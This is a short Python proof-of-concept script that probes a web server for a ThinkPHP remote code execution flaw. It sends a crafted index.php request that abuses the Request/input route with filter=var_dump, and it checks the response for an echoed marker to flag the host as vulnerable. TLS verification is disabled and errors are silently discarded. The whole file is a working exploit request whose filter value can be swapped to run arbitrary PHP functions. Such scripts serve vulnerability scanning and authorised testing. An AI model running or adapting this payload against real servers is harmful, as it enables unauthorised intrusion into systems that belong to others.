#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_request_input_rce_verify(url):
    pocdict = {
        "vulnname":"thinkphp_request_input_rce",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass
